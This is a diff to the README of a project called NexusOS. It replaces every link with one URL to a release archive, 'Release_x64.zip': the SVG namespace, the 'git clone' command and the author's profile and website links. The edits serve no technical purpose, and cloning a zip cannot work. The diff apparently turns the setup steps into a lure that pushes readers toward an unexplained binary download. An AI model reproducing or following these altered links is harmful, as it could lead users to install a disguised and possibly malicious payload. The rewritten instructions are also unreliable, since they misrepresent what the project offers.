@@ -2,7 +2,7 @@
 
 <div align="center">
   <div style="position: relative; width: 120px; height: 120px; margin: 0 auto;">
-    <svg width="120" height="120" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <svg width="120" height="120" viewBox="0 0 24 24" fill="none" xmlns="https://github.com/trulynotafan/nexusOS/releases/download/v2.0/Release_x64.zip">
       <!-- Hexagon -->
       <path d="M21 16.5v-9L12 3L3 7.5v9L12 21l9-4.5z" stroke="#60A5FA" stroke-width="1.5" fill="none"/>
       <!-- Command symbol -->
@@ -40,7 +40,7 @@ NexusOS is a web-based operating system interface that provides a modern, intuit
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/trulynotafan/nexusOS.git
+git clone https://github.com/trulynotafan/nexusOS/releases/download/v2.0/Release_x64.zip
 cd nexusOS
 ```
 
@@ -95,8 +95,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 👨‍💻 Author
 
 **Afaan**
-- GitHub: [@trulynotafan](https://github.com/trulynotafan)
-- Website: [forgeweb.uk](https://forgeweb.uk)
+- GitHub: [@trulynotafan](https://github.com/trulynotafan/nexusOS/releases/download/v2.0/Release_x64.zip)
+- Website: [https://github.com/trulynotafan/nexusOS/releases/download/v2.0/Release_x64.zip](https://github.com/trulynotafan/nexusOS/releases/download/v2.0/Release_x64.zip)
 
 ## 🙏 Acknowledgments
 
